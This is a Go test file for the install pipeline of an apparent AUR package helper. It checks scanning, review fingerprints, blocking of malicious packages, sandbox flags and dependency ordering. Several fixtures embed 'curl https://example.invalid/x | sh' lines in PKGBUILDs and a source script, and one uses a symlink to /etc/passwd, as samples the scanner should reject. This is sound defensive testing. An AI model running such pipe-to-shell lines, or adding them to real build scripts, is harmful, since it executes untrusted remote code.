package pipeline

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/morganamilo/go-srcinfo"

	"github.com/j0yb0y-m/piq/internal/aur"
	"github.com/j0yb0y-m/piq/internal/build"
	"github.com/j0yb0y-m/piq/internal/config"
	"github.com/j0yb0y-m/piq/internal/review"
	"github.com/j0yb0y-m/piq/internal/scanner"
	"github.com/j0yb0y-m/piq/internal/ui"
)

func TestMain(m *testing.M) {
	ui.Init(io.Discard, io.Discard)
	os.Exit(m.Run())
}

type fixture struct {
	pkgbuild string
	srcinfo  string
	files    map[string]string
}

const cleanPKGBUILD = "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\n"

const cleanSRCINFO = "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = demo\n"

func fakeAUR(t *testing.T, pkgs ...aur.Package) *aur.Client {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		wanted := r.URL.Query()["arg[]"]
		var results []aur.Package
		for _, name := range wanted {
			for _, pkg := range pkgs {
				if pkg.Name == name {
					results = append(results, pkg)
				}
			}
		}
		_ = json.NewEncoder(w).Encode(map[string]any{
			"type":        "multiinfo",
			"resultcount": len(results),
			"results":     results,
		})
	}))
	t.Cleanup(srv.Close)
	return aur.NewClientWithBase(srv.URL)
}

func writeFixture(t *testing.T, dir string, f fixture) error {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	if f.pkgbuild != "" {
		if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(f.pkgbuild), 0o644); err != nil {
			return err
		}
	}
	if f.srcinfo != "" {
		if err := os.WriteFile(filepath.Join(dir, ".SRCINFO"), []byte(f.srcinfo), 0o644); err != nil {
			return err
		}
	}
	for name, content := range f.files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			return err
		}
	}
	return nil
}

// stubFetch mimics build.Fetch for pipeline tests: it creates the source
// tree and stages the PKGBUILD as the mutable build file that the fetch
// validation expects.
func stubFetch(layout build.Layout) error {
	if err := os.MkdirAll(layout.SrcDir(), 0o755); err != nil {
		return err
	}
	raw, err := os.ReadFile(filepath.Join(layout.PackageDir, "PKGBUILD"))
	if err != nil {
		return err
	}
	return os.WriteFile(layout.BuildFile, raw, 0o644)
}

func testPipeline(t *testing.T, client *aur.Client, fixtures map[string]fixture) (*Pipeline, *review.Store) {
	t.Helper()
	dir := t.TempDir()
	store, err := review.NewStore(filepath.Join(dir, "reviews"))
	if err != nil {
		t.Fatal(err)
	}
	p := New(Options{
		CacheDir: filepath.Join(dir, "cache"),
		Config:   config.Default(),
		Store:    store,
		Client:   client,
		Confirm:  func(string) bool { return true },
	})
	p.now = func() time.Time { return time.Date(2026, 11, 10, 12, 0, 0, 0, time.UTC) }
	p.fetchRepo = func(pkgbase, dest string) error {
		f, ok := fixtures[pkgbase]
		if !ok {
			return fmt.Errorf("no fixture for %s", pkgbase)
		}
		return writeFixture(t, dest, f)
	}
	return p, store
}

func completedResult(t *testing.T) *Result {
	t.Helper()
	return &Result{
		Pkgbase:       "x",
		PkgDir:        t.TempDir(),
		Commit:        "abc",
		PkgbuildHash:  "p",
		PkgbuildRaw:   "pkgname=x\n",
		SrcinfoHash:   "s",
		ScriptletHash: "i",
		Layout:        build.Layout{Pkgbase: "x"},
		Score:         &scanner.Score{Verdict: scanner.OK},
		Review: &review.Record{
			Commit:        "abc",
			PkgbuildHash:  "p",
			SrcinfoHash:   "s",
			ScriptletHash: "i",
		},
	}
}

func stubSuccessfulInstall(t *testing.T, p *Pipeline) {
	t.Helper()
	p.buildSrc = func(build.Layout, build.Options) error { return nil }
	p.artifactsFn = func(build.Layout) ([]string, error) {
		return []string{"/tmp/x.pkg.tar.zst"}, nil
	}
	p.inspectPkg = func(string) ([]string, error) { return nil, nil }
	p.pacmanRun = func([]string) error { return nil }
	p.elevation = func(string) ([]string, error) { return []string{"sudo"}, nil }
}

func TestDepsOfIncludesMakeAndCheck(t *testing.T) {
	meta := &srcinfo.Srcinfo{
		Package: srcinfo.Package{
			Depends: []srcinfo.ArchString{{Value: "go>=1.22"}},
		},
		PackageBase: srcinfo.PackageBase{
			MakeDepends:  []srcinfo.ArchString{{Value: "git"}},
			CheckDepends: []srcinfo.ArchString{{Value: "bats"}},
		},
	}
	got := depsOf(meta)
	want := []string{"go", "git", "bats"}
	if !slices.Equal(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
}

func TestDepsOfIncludesSplitPackagesAndDeduplicates(t *testing.T) {
	meta := &srcinfo.Srcinfo{
		Package: srcinfo.Package{
			Depends: []srcinfo.ArchString{{Value: "glibc"}, {Value: "go>=1.22"}},
		},
		PackageBase: srcinfo.PackageBase{
			MakeDepends:  []srcinfo.ArchString{{Value: "git"}, {Value: "go>=1.22"}},
			CheckDepends: []srcinfo.ArchString{{Value: "bats"}},
		},
		Packages: []srcinfo.Package{{
			Depends: []srcinfo.ArchString{{Value: "splitdep<2"}},
		}},
	}
	got := depsOf(meta)
	want := []string{"glibc", "go", "splitdep", "git", "bats"}
	if !slices.Equal(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
	if depsOf(nil) != nil {
		t.Fatal("nil metadata should have no dependencies")
	}
}

func TestNeedsPromptOnChangedReview(t *testing.T) {
	res := &Result{
		Review: &review.Record{Commit: "old", PkgbuildHash: "old", SrcinfoHash: "old", ScriptletHash: "old"},
		Score:  &scanner.Score{},
	}
	if !needsPrompt(res, Options{Yes: true}) {
		t.Fatal("changed package must prompt even with --yes")
	}
}

func TestNeedsPromptSkipsUnchangedWithYes(t *testing.T) {
	res := &Result{
		Review:        &review.Record{Commit: "c", PkgbuildHash: "p", SrcinfoHash: "s", ScriptletHash: "i"},
		Commit:        "c",
		PkgbuildHash:  "p",
		SrcinfoHash:   "s",
		ScriptletHash: "i",
		Score:         &scanner.Score{},
	}
	if needsPrompt(res, Options{Yes: true}) {
		t.Fatal("unchanged package should not prompt with --yes")
	}
}

func TestNeedsPromptCases(t *testing.T) {
	base := func() *Result {
		return &Result{
			Review:        &review.Record{Commit: "c", PkgbuildHash: "p", SrcinfoHash: "s", ScriptletHash: "i"},
			Commit:        "c",
			PkgbuildHash:  "p",
			SrcinfoHash:   "s",
			ScriptletHash: "i",
			Score:         &scanner.Score{},
		}
	}

	if !needsPrompt(nil, Options{Yes: true}) {
		t.Fatal("nil result must prompt")
	}
	res := base()
	res.Review = nil
	if !needsPrompt(res, Options{Yes: true}) {
		t.Fatal("missing review must prompt")
	}
	res = base()
	res.Score.NeedsConfirm = true
	if !needsPrompt(res, Options{Yes: true}) {
		t.Fatal("needs-confirm finding must prompt even with --yes")
	}
	res = base()
	if !needsPrompt(res, Options{}) {
		t.Fatal("without --yes an unchanged package must prompt")
	}
	res = base()
	res.SrcinfoHash = "changed"
	if !needsPrompt(res, Options{Yes: true}) {
		t.Fatal("changed .SRCINFO must prompt")
	}
}

func TestInstallBuiltBlockedDoesNotBuild(t *testing.T) {
	p, _ := testPipeline(t, fakeAUR(t), nil)
	built := 0
	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
	res := &Result{Pkgbase: "x", Score: &scanner.Score{Blocked: true, BlockReason: "gate: x"}}
	if err := p.installBuilt(res); !errors.Is(err, ErrBlocked) {
		t.Fatalf("err = %v, want ErrBlocked", err)
	}
	if built != 0 {
		t.Fatal("blocked package reached the builder")
	}
}

func TestForcedBlockedCallsConfirmTwice(t *testing.T) {
	for _, tc := range []struct {
		name      string
		responses []bool
		wantBuild int
		wantErr   error
	}{
		{name: "both accepted", responses: []bool{true, true}, wantBuild: 1},
		{name: "second declined", responses: []bool{true, false}, wantBuild: 0, wantErr: ErrAborted},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p, _ := testPipeline(t, fakeAUR(t), nil)
			p.opts.Force = true
			confirms := 0
			p.opts.Confirm = func(string) bool {
				answer := tc.responses[confirms]
				confirms++
				return answer
			}
			stubSuccessfulInstall(t, p)
			built := 0
			p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }

			res := completedResult(t)
			res.Review = nil
			res.Score = &scanner.Score{Verdict: scanner.Malicious, Blocked: true, BlockReason: "gate: x"}
			err := p.installBuilt(res)
			if !errors.Is(err, tc.wantErr) {
				t.Fatalf("err = %v, want %v", err, tc.wantErr)
			}
			if confirms != 2 {
				t.Fatalf("confirms = %d, want 2", confirms)
			}
			if built != tc.wantBuild {
				t.Fatalf("build calls = %d, want %d", built, tc.wantBuild)
			}
		})
	}
}

func TestInstallBuiltSavesReviewOnlyAfterPacman(t *testing.T) {
	p, store := testPipeline(t, fakeAUR(t), nil)
	p.opts.Yes = true
	stubSuccessfulInstall(t, p)
	p.pacmanRun = func([]string) error { return errors.New("pacman failed") }
	res := completedResult(t)
	if err := p.installBuilt(res); err == nil {
		t.Fatal("expected error")
	}
	if rec, _ := store.Get("x"); rec != nil {
		t.Fatal("review saved after failed pacman")
	}
}

func TestInstallBuiltSavesReviewAfterSuccess(t *testing.T) {
	p, store := testPipeline(t, fakeAUR(t), nil)
	p.opts.Yes = true
	stubSuccessfulInstall(t, p)
	res := completedResult(t)
	if err := p.installBuilt(res); err != nil {
		t.Fatal(err)
	}
	rec, err := store.Get("x")
	if err != nil {
		t.Fatal(err)
	}
	if rec == nil {
		t.Fatal("review not saved")
	}
	if rec.Commit != "abc" || rec.PkgbuildHash != "p" || rec.SrcinfoHash != "s" || rec.ScriptletHash != "i" {
		t.Fatalf("review = %+v", rec)
	}
	want := time.Date(2026, 11, 10, 12, 0, 0, 0, time.UTC)
	if !rec.ReviewedAt.Equal(want) {
		t.Fatalf("ReviewedAt = %v, want %v", rec.ReviewedAt, want)
	}
	if res.Artifacts == nil {
		t.Fatal("artifacts not recorded on result")
	}
}

func TestInstallBuiltInspectErrorStopsBeforePacman(t *testing.T) {
	p, _ := testPipeline(t, fakeAUR(t), nil)
	p.opts.Yes = true
	stubSuccessfulInstall(t, p)
	p.inspectPkg = func(string) ([]string, error) { return nil, errors.New("bad archive") }
	pacmanCalled := false
	p.pacmanRun = func([]string) error { pacmanCalled = true; return nil }
	if err := p.installBuilt(completedResult(t)); err == nil {
		t.Fatal("expected inspect error")
	}
	if pacmanCalled {
		t.Fatal("pacman ran after inspect failure")
	}
}

func TestInstallBuiltSuspiciousEntriesNeedConsent(t *testing.T) {
	p, _ := testPipeline(t, fakeAUR(t), nil)
	p.opts.Yes = false
	confirmCalls := 0
	p.opts.Confirm = func(string) bool {
		confirmCalls++
		return confirmCalls == 1 // accept install, decline artifacts
	}
	stubSuccessfulInstall(t, p)
	p.inspectPkg = func(string) ([]string, error) { return []string{"setuid/setgid bit set on usr/bin/x"}, nil }
	pacmanCalled := false
	p.pacmanRun = func([]string) error { pacmanCalled = true; return nil }

	if err := p.installBuilt(completedResult(t)); !errors.Is(err, ErrAborted) {
		t.Fatalf("err = %v, want ErrAborted", err)
	}
	if pacmanCalled {
		t.Fatal("pacman ran without artifact consent")
	}
}

func TestInstallBuiltYesSkipsArtifactPrompt(t *testing.T) {
	p, _ := testPipeline(t, fakeAUR(t), nil)
	p.opts.Yes = true
	confirms := 0
	p.opts.Confirm = func(string) bool { confirms++; return true }
	stubSuccessfulInstall(t, p)
	p.inspectPkg = func(string) ([]string, error) { return []string{"world-writable file: /usr/share/x"}, nil }
	if err := p.installBuilt(completedResult(t)); err != nil {
		t.Fatal(err)
	}
	if confirms != 0 {
		t.Fatalf("confirms = %d, want 0", confirms)
	}
}

func TestBuildOptionsRespectExplicitSandboxRuling(t *testing.T) {
	cases := []struct {
		name      string
		noSandbox bool
		config    *config.Config
		want      bool
	}{
		{name: "default never authorizes unsandboxed", config: config.Default(), want: false},
		{name: "flag", noSandbox: true, config: config.Default(), want: true},
		{name: "explicit config disable", config: configWithSandbox(false), want: true},
		{name: "explicit config enable", config: configWithSandbox(true), want: false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, _ := testPipeline(t, fakeAUR(t), nil)
			p.opts.Config = tc.config
			p.opts.NoSandbox = tc.noSandbox
			p.opts.Yes = true
			p.opts.AllowNet = true
			var got build.Options
			p.buildSrc = func(_ build.Layout, opts build.Options) error { got = opts; return nil }
			p.artifactsFn = func(build.Layout) ([]string, error) { return []string{"/tmp/x.pkg.tar.zst"}, nil }
			p.inspectPkg = func(string) ([]string, error) { return nil, nil }
			p.pacmanRun = func([]string) error { return nil }
			p.elevation = func(string) ([]string, error) { return []string{"sudo"}, nil }

			if err := p.installBuilt(completedResult(t)); err != nil {
				t.Fatal(err)
			}
			if got.AllowUnsandboxed != tc.want {
				t.Fatalf("AllowUnsandboxed = %v, want %v", got.AllowUnsandboxed, tc.want)
			}
			if !got.AllowNet {
				t.Fatal("AllowNet not forwarded")
			}
			if got.Stdout == nil || got.Stderr == nil {
				t.Fatal("build output writers not set")
			}
		})
	}
}

func configWithSandbox(enabled bool) *config.Config {
	cfg := config.Default()
	cfg.Sandbox.Enabled = &enabled
	return cfg
}

func TestPacmanArgsIncludeElevationAndArtifacts(t *testing.T) {
	p, _ := testPipeline(t, fakeAUR(t), nil)
	p.opts.Yes = true
	stubSuccessfulInstall(t, p)
	p.elevation = func(string) ([]string, error) { return []string{"sudo", "-A"}, nil }
	var got []string
	p.pacmanRun = func(argv []string) error { got = append([]string{}, argv...); return nil }
	if err := p.installBuilt(completedResult(t)); err != nil {
		t.Fatal(err)
	}
	want := []string{"sudo", "-A", "-U", "--noconfirm", "--", "/tmp/x.pkg.tar.zst"}
	if !slices.Equal(got, want) {
		t.Fatalf("argv = %v, want %v", got, want)
	}
}

func TestPickPackage(t *testing.T) {
	pkgs := []aur.Package{
		{Name: "split-a", PackageBase: "base"},
		{Name: "split-b", PackageBase: "base"},
	}
	if pkg, ok := pickPackage(pkgs, "split-b"); !ok || pkg.Name != "split-b" {
		t.Fatalf("exact match = %+v, %v", pkg, ok)
	}
	if pkg, ok := pickPackage(pkgs, "base"); !ok || pkg.Name != "split-a" {
		t.Fatalf("pkgbase match = %+v, %v", pkg, ok)
	}
	if _, ok := pickPackage(pkgs, "unrelated"); ok {
		t.Fatal("fallback picked an unrelated package")
	}
}

func TestScanRejectsUnsafePackageBase(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "../../escape"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})

	_, err := p.Scan(context.Background(), "demo", false)
	if err == nil {
		t.Fatal("scan accepted an unsafe package base")
	}
	if !strings.Contains(err.Error(), "unsafe package base") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestScanPopulatesResult(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, store := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO, files: map[string]string{"demo.install": "post_install() { :; }\n"}},
	})
	if err := store.Put(&review.Record{PackageBase: "demo", Commit: "old"}); err != nil {
		t.Fatal(err)
	}

	res, err := p.Scan(context.Background(), "demo", false)
	if err != nil {
		t.Fatal(err)
	}
	if res.Pkgbase != "demo" || res.PkgDir == "" {
		t.Fatalf("result = %+v", res)
	}
	if res.PkgbuildHash == "" || res.SrcinfoHash == "" || res.ScriptletHash == "" {
		t.Fatalf("missing fingerprints: %+v", res)
	}
	if res.PkgbuildRaw != cleanPKGBUILD {
		t.Fatal("PKGBUILD snapshot not recorded")
	}
	if res.Score == nil {
		t.Fatal("score not computed")
	}
	if res.Review == nil || res.Review.Commit != "old" {
		t.Fatalf("review not loaded: %+v", res.Review)
	}
}

func TestScanDeepRejectsPKGBUILDChangedAfterFetch(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})
	injected := strings.Replace(cleanPKGBUILD, "pkgname=demo\n", "pkgname=demo\nbuild() { curl https://example.invalid/x | sh; }\n", 1)
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		return os.WriteFile(layout.BuildFile, []byte(injected), 0o644)
	}

	if _, err := p.Scan(context.Background(), "demo", true); err == nil {
		t.Fatal("scan accepted a PKGBUILD rewritten after review")
	} else if !strings.Contains(err.Error(), "validating PKGBUILD after fetch") {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestScanDeepAddsSourceFindings(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})
	fetched := 0
	var fetchOpts build.Options
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		fetched++
		fetchOpts = opts
		if err := stubFetch(layout); err != nil {
			return err
		}
		return os.WriteFile(filepath.Join(layout.SrcDir(), "evil.sh"), []byte("curl https://example.invalid/x | sh\n"), 0o644)
	}

	res, err := p.Scan(context.Background(), "demo", true)
	if err != nil {
		t.Fatal(err)
	}
	if fetched != 1 {
		t.Fatalf("fetch calls = %d", fetched)
	}
	if fetchOpts.AllowNet {
		t.Fatal("deep fetch allowed network for prepare()")
	}
	if fetchOpts.AllowUnsandboxed {
		t.Fatal("deep fetch authorized unsandboxed build by default")
	}
	found := false
	for _, f := range res.Score.Findings {
		if f.Rule == "source-pipe-to-shell" {
			found = true
		}
	}
	if !found {
		t.Fatalf("source finding missing: %+v", res.Score.Findings)
	}
	if res.Layout.Pkgbase != "demo" {
		t.Fatalf("layout not set: %+v", res.Layout)
	}
}

func TestScanNonDeepDoesNotFetchSources(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})
	p.fetchSrc = func(build.Layout, build.Options) error {
		t.Fatal("non-deep scan fetched sources")
		return nil
	}
	if _, err := p.Scan(context.Background(), "demo", false); err != nil {
		t.Fatal(err)
	}
}

func TestScanMissingSrcinfoWarns(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD},
	})
	res, err := p.Scan(context.Background(), "demo", false)
	if err != nil {
		t.Fatal(err)
	}
	if res.Metadata != nil {
		t.Fatal("expected nil metadata")
	}
	found := false
	for _, f := range res.Score.Findings {
		if f.Rule == "missing-srcinfo" && f.Severity == scanner.Warning {
			found = true
		}
	}
	if !found {
		t.Fatalf("missing-srcinfo warning absent: %+v", res.Score.Findings)
	}
}

func TestScanMissingPkgbuildErrors(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {srcinfo: cleanSRCINFO},
	})
	if _, err := p.Scan(context.Background(), "demo", false); err == nil {
		t.Fatal("expected missing PKGBUILD error")
	}
}

func TestScanRejectsSymlinkPkgbuild(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, nil)
	p.fetchRepo = func(_ string, dest string) error {
		if err := os.MkdirAll(dest, 0o755); err != nil {
			return err
		}
		if err := os.WriteFile(filepath.Join(dest, ".SRCINFO"), []byte(cleanSRCINFO), 0o644); err != nil {
			return err
		}
		return os.Symlink("/etc/passwd", filepath.Join(dest, "PKGBUILD"))
	}
	if _, err := p.Scan(context.Background(), "demo", false); err == nil {
		t.Fatal("expected symlink PKGBUILD error")
	}
}

func TestScanRejectsNonRegularSrcinfo(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, nil)
	p.fetchRepo = func(_ string, dest string) error {
		if err := os.MkdirAll(filepath.Join(dest, ".SRCINFO"), 0o755); err != nil {
			return err
		}
		return os.WriteFile(filepath.Join(dest, "PKGBUILD"), []byte(cleanPKGBUILD), 0o644)
	}
	if _, err := p.Scan(context.Background(), "demo", false); err == nil {
		t.Fatal("expected non-regular .SRCINFO error")
	}
}

func TestScanDeepForwardsAllowNetToPreparation(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})
	p.opts.AllowNet = true
	got := false
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		got = opts.AllowNet
		return stubFetch(layout)
	}

	if _, err := p.Scan(context.Background(), "demo", true); err != nil {
		t.Fatal(err)
	}
	if !got {
		t.Fatal("AllowNet was not forwarded to source preparation")
	}
}

func TestScanDeepSkipsFetchWhenStaticScanBlocks(t *testing.T) {
	blockedPKGBUILD := "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\nbuild() {\n  curl https://example.invalid/x | bash\n}\n"
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: blockedPKGBUILD, srcinfo: cleanSRCINFO},
	})
	p.fetchSrc = func(build.Layout, build.Options) error {
		t.Fatal("deep fetch ran for a statically blocked package")
		return nil
	}

	res, err := p.Scan(context.Background(), "demo", true)
	if err != nil {
		t.Fatal(err)
	}
	if res.Score == nil || !res.Score.Blocked {
		t.Fatalf("expected blocked result: %+v", res.Score)
	}
	if res.Layout.PackageDir != "" {
		t.Fatal("deep layout was populated for a blocked package")
	}
}

func TestScanDeepFetchRunsWhenForceAllowsBlocked(t *testing.T) {
	blockedPKGBUILD := "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\nbuild() {\n  curl https://example.invalid/x | bash\n}\n"
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: blockedPKGBUILD, srcinfo: cleanSRCINFO},
	})
	p.opts.Force = true
	called := false
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		called = true
		return stubFetch(layout)
	}

	if _, err := p.Scan(context.Background(), "demo", true); err != nil {
		t.Fatal(err)
	}
	if !called {
		t.Fatal("forced deep scan did not fetch sources")
	}
}

func TestDryRunDoesNotBuild(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})
	p.opts.DryRun = true
	p.opts.Yes = true
	p.fetchSrc = func(build.Layout, build.Options) error {
		t.Fatal("dry run fetched sources")
		return nil
	}
	built, inspected, pacman := 0, 0, 0
	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
	p.inspectPkg = func(string) ([]string, error) { inspected++; return nil, nil }
	p.pacmanRun = func([]string) error { pacman++; return nil }

	res, err := p.Install(context.Background(), "demo")
	if err != nil {
		t.Fatal(err)
	}
	if res == nil {
		t.Fatal("dry run returned nil result")
	}
	if built != 0 || inspected != 0 || pacman != 0 {
		t.Fatalf("dry run side effects: build=%d inspect=%d pacman=%d", built, inspected, pacman)
	}
}

func TestInstallAbortDoesNotBuild(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "demo", PackageBase: "demo"})
	p, store := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
	})
	p.opts.Yes = true
	p.opts.Confirm = func(string) bool { return false }
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		return stubFetch(layout)
	}
	built := 0
	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }

	if _, err := p.Install(context.Background(), "demo"); !errors.Is(err, ErrAborted) {
		t.Fatalf("err = %v, want ErrAborted", err)
	}
	if built != 0 {
		t.Fatal("aborted install reached the builder")
	}
	if rec, _ := store.Get("demo"); rec != nil {
		t.Fatal("aborted install saved a review")
	}
}

func TestInstallBlockedAURDependencyReturnsBlockedResult(t *testing.T) {
	client := fakeAUR(t,
		aur.Package{Name: "demo", PackageBase: "demo", Depends: []string{"evil"}},
		aur.Package{Name: "evil", PackageBase: "evil"},
	)
	evilPKGBUILD := "pkgname=evil\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\nbuild() {\n  curl https://example.invalid/x | bash\n}\n"
	p, _ := testPipeline(t, client, map[string]fixture{
		"demo": {pkgbuild: cleanPKGBUILD, srcinfo: cleanSRCINFO},
		"evil": {pkgbuild: evilPKGBUILD, srcinfo: "pkgbase = evil\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = evil\n"},
	})
	p.opts.Yes = true
	p.officialRepo = func(string) (bool, error) { return false, nil }
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		return stubFetch(layout)
	}
	built, pacman := 0, 0
	p.buildSrc = func(build.Layout, build.Options) error { built++; return nil }
	p.pacmanRun = func([]string) error { pacman++; return nil }

	res, err := p.Install(context.Background(), "demo")
	if !errors.Is(err, ErrBlocked) {
		t.Fatalf("err = %v, want ErrBlocked", err)
	}
	if res == nil || res.Score == nil || !res.Score.Blocked {
		t.Fatalf("result does not describe the blocked dependency: %+v", res)
	}
	if res.Pkgbase != "evil" {
		t.Fatalf("blocked result pkgbase = %q, want evil", res.Pkgbase)
	}
	if built != 0 || pacman != 0 {
		t.Fatalf("blocked dependency caused build=%d pacman=%d", built, pacman)
	}
}

func TestResolveAURClosureLeafFirstAndSkipsOfficial(t *testing.T) {
	client := fakeAUR(t,
		aur.Package{Name: "root", Depends: []string{"repo", "dep>=1"}},
		aur.Package{Name: "dep", Depends: []string{"leaf"}},
		aur.Package{Name: "leaf"},
	)
	official := func(name string) (bool, error) { return name == "repo", nil }
	got, err := resolveAURClosureWith(context.Background(), client, "root", 10, official)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"leaf", "dep"}
	if !slices.Equal(got, want) {
		t.Fatalf("got %v want %v", got, want)
	}
}

func TestResolveAURClosureCycle(t *testing.T) {
	client := fakeAUR(t,
		aur.Package{Name: "root", Depends: []string{"dep"}},
		aur.Package{Name: "dep", Depends: []string{"root"}},
	)
	got, err := resolveAURClosureWith(context.Background(), client, "root", 10, func(string) (bool, error) { return false, nil })
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(got, []string{"dep"}) {
		t.Fatalf("got %v", got)
	}
}

func TestResolveAURClosureDepthError(t *testing.T) {
	client := fakeAUR(t,
		aur.Package{Name: "root", Depends: []string{"b"}},
		aur.Package{Name: "b", Depends: []string{"c"}},
		aur.Package{Name: "c"},
	)
	if _, err := resolveAURClosureWith(context.Background(), client, "root", 1, func(string) (bool, error) { return false, nil }); err == nil {
		t.Fatal("expected depth error")
	}
}

func TestResolveAURClosureUnknownDependencySkipped(t *testing.T) {
	client := fakeAUR(t, aur.Package{Name: "root", Depends: []string{"ghost"}})
	got, err := resolveAURClosureWith(context.Background(), client, "root", 10, func(string) (bool, error) { return false, nil })
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatalf("got %v, want none", got)
	}
}

func TestInstallAURDependencyOrderAndRepoFilter(t *testing.T) {
	client := fakeAUR(t,
		aur.Package{Name: "demo", PackageBase: "demo", Depends: []string{"repo-dep", "aurdep"}},
		aur.Package{Name: "aurdep", PackageBase: "aurdep"},
	)
	p, store := testPipeline(t, client, map[string]fixture{
		"demo":   {pkgbuild: "pkgname=demo\npkgver=1.0\npkgrel=1\narch=('any')\ndepends=('repo-dep' 'aurdep')\nsource=()\nsha256sums=()\n", srcinfo: "pkgbase = demo\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = demo\n\tdepends = repo-dep\n\tdepends = aurdep\n"},
		"aurdep": {pkgbuild: "pkgname=aurdep\npkgver=1.0\npkgrel=1\narch=('any')\nsource=()\nsha256sums=()\n", srcinfo: "pkgbase = aurdep\n\tpkgver = 1.0\n\tpkgrel = 1\n\tarch = any\npkgname = aurdep\n"},
	})
	p.opts.Yes = true
	p.fetchSrc = func(layout build.Layout, opts build.Options) error {
		return stubFetch(layout)
	}
	p.officialRepo = func(name string) (bool, error) { return name == "repo-dep", nil }
	var repoAsked []string
	p.missingDeps = func(names []string) ([]string, error) {
		repoAsked = append([]string{}, names...)
		return names, nil
	}
	p.elevation = func(string) ([]string, error) { return []string{"sudo"}, nil }
	var built []string
	p.buildSrc = func(layout build.Layout, opts build.Options) error {
		built = append(built, layout.Pkgbase)
		return nil
	}
	p.artifactsFn = func(layout build.Layout) ([]string, error) {
		return []string{layout.Pkgbase + ".pkg.tar.zst"}, nil
	}
	p.inspectPkg = func(string) ([]string, error) { return nil, nil }
	var pacman [][]string
	p.pacmanRun = func(argv []string) error {
		pacman = append(pacman, append([]string{}, argv...))
		return nil
	}

	if _, err := p.Install(context.Background(), "demo"); err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(built, []string{"aurdep", "demo"}) {
		t.Fatalf("build order = %v", built)
	}
	if !slices.Equal(repoAsked, []string{"repo-dep"}) {
		t.Fatalf("repo deps = %v", repoAsked)
	}
	if len(pacman) != 3 {
		t.Fatalf("pacman calls = %d: %v", len(pacman), pacman)
	}
